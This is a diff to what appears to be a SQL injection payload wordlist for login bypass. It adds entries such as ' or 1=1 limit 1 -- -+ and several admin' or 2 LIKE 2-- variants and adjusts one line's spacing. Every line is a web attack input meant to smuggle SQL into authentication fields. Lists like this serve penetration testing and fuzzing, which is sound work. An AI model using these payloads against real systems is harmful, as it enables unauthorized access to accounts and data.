@@ -1,8 +1,10 @@
-    '-'
+            '-'
     ' '
     '&'
     '^'
     '*'
+    ' or 1=1 limit 1 -- -+
+    '="or'
     ' or ''-'
     ' or '' '
     ' or ''&'
@@ -29,6 +31,7 @@
     " or "x"="x
     ") or ("x")=("x
     ")) or (("x"))=(("x
+    or 2 like 2
     or 1=1
     or 1=1--
     or 1=1#
@@ -36,6 +39,14 @@
     admin' --
     admin' #
     admin'/*
+    admin' or '2' LIKE '1
+    admin' or 2 LIKE 2--
+    admin' or 2 LIKE 2#
+    admin') or 2 LIKE 2#
+    admin') or 2 LIKE 2--
+    admin') or ('2' LIKE '2
+    admin') or ('2' LIKE '2'#
+    admin') or ('2' LIKE '2'/*
     admin' or '1'='1
     admin' or '1'='1'--
     admin' or '1'='1'#
